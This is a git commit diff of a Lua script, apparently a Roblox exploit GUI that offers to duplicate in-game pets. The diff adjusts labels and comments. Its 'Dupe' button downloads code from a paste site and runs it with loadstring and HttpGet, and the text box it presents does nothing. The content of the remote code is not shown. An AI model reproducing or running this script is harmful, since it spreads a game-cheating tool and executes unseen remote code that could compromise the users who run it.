ae9978cef3f5805e2535b2c247919b70ce68afff
exclusiv1337 <exclusiv1392@gmail.com>
2025-05-24 16:21:07 +0200

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -3,20 +3,19 @@ local Window = Library.CreateLib("Dupe Pets by Mangekoy2 | v2.0", "Serpent")
 
 -- Вкладка Dupe Pet
 local DupeTab = Window:NewTab("Dupe Pet")
-local DupeSection = DupeTab:NewSection("DUPE PET")  -- Зеленый заголовок
+local DupeSection = DupeTab:NewSection("DUPE PET")
 
--- Текстовое поле для ввода
-local InputField = DupeSection:NewTextBox("", "Type here!", function(text)
-    -- Можно использовать введенный текст
+-- Текстовое поле с подсказкой
+local InputField = DupeSection:NewTextBox("", "Write any pet", function(text)
+    -- Обработка введенного текста
 end)
 InputField.Instance.Size = UDim2.new(0, 250, 0, 30)
 
 -- Кнопка Dupe
-local DupeButton = DupeSection:NewButton("Dupe", "", function()
+DupeSection:NewButton("Dupe", "", function()
     loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
 end)
-DupeButton.Instance.Size = UDim2.new(0, 100, 0, 30)
 
 -- Вкладка Credits
-local CreditsTab = Window:NewTab("Credits")
+local CreditsTab = Window:NewTab("CREDITS")
 CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
